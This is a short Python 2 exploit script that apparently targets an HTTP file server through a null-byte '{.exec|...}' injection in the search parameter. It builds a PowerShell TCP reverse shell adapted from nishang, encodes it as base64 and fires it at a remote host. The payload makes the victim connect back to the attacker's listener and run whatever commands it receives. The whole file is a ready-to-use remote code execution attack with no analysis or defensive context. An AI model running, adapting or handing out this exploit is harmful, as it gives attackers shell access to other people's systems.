#!/usr/bin/env python2
#Author: Alamot
#nishang-Link:https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1

import sys
import urllib, urllib2
from base64 import b64encode

if (len(sys.argv) < 5):
    print("usage: <RHOST> <RPORT> <LHOST> <LPORT>")
    exit()

RHOST = sys.argv[1]
RPORT = sys.argv[2]
LHOST = sys.argv[3]
LPORT = sys.argv[4]

print("RHOST="+RHOST+" RPORT="+RPORT+" LHOST="+LHOST+" LPORT="+LPORT+'\n')

payload = "$client = New-Object System.Net.Sockets.TCPClient('"+LHOST+"',"+LPORT+"); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close();"

print(payload+'\n')

b64enc_command = b64encode(payload.encode('UTF-16LE')).replace('+','%2b')

url = "http://"+RHOST+":"+RPORT+"/?search=%00{.exec%7CC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe%20-EncodedCommand%20"+b64enc_command+".}"

print(url)
response = urllib2.urlopen(url)
print("\nSTATUS: "+str(response.getcode())
